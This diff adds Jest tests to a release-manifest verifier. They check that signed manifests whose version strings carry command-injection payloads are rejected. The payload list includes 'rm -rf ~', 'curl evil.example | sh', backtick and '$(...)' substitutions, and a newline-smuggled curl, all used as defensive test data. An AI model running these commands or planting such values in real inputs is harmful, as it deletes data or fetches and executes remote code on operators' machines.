@@ -210,6 +210,41 @@ describe("release-manifest verifier", () => {
       expect(result.ok).toBe(false);
       if (!result.ok) expect(result.reason).toBe("malformed");
     });
+
+    it("rejects a CORRECTLY SIGNED manifest whose version is not semver-shaped (injection guard)", () => {
+      // Defense-in-depth: the attested version string is interpolated into a
+      // copy-paste command the operator is told to run, so even a validly
+      // signed body must carry a clean X.Y.Z[-prerelease] version. This caps
+      // what a compromised signer could put into that command.
+      const { publicKey, privateKey } = generateKeypair();
+      const payloads = [
+        "9.9.9; rm -rf ~",
+        "9.9.9 && curl evil.example | sh",
+        "9.9.9`touch /tmp/pwned`",
+        "9.9.9$(reboot)",
+        "9.9.9\ncurl evil.example",
+      ];
+      for (const version of payloads) {
+        const manifest = signManifest(
+          { version, artifact_hashes: {} },
+          privateKey,
+        );
+        const result = verifyReleaseManifestWithKey(manifest, publicKey);
+        expect(result.ok).toBe(false);
+        if (!result.ok) expect(result.reason).toBe("malformed");
+      }
+    });
+
+    it("rejects a correctly signed manifest with an empty version string", () => {
+      const { publicKey, privateKey } = generateKeypair();
+      const manifest = signManifest(
+        { version: "", artifact_hashes: {} },
+        privateKey,
+      );
+      const result = verifyReleaseManifestWithKey(manifest, publicKey);
+      expect(result.ok).toBe(false);
+      if (!result.ok) expect(result.reason).toBe("malformed");
+    });
   });
 
   describe("pinned-key gate (live production key, activated 2026-07-01)", () => {
